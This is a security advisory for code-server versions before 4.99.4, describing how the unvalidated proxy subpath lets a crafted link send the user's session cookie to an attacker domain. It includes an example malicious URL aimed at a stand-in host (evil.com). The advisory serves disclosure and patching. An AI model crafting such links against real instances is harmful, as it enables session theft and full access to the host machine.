Description : code-server runs VS Code on any machine anywhere through browser access. Prior to version 4.99.4
a maliciously [[crafted]] [[URL]] using the proxy subpath can result in the [[attacker]] gaining access to the session [[token]]. Failure to properly validate the port for a proxy request can result in proxying to an arbitrary domain. The malicious [[URL]] `https:///proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the [[attacker]] could exfiltrate a user's session [[token]]. Any user who runs code-server with the built-in proxy enabled and clicks on maliciously [[crafted]] links that go to their code-server instances with reference to /proxy. Normally this is used to proxy local ports
however the [[URL]] can reference the [[attacker]]'s domain instead
and the connection is then proxied to that domain
which will include sending cookies. With access to the session cookie
the [[attacker]] can then log into code-server and have full access to the machine hosting code-server as the user running code-server. This issue has been patched in version 4.99.4.

Severity: 8.3 | HIGH
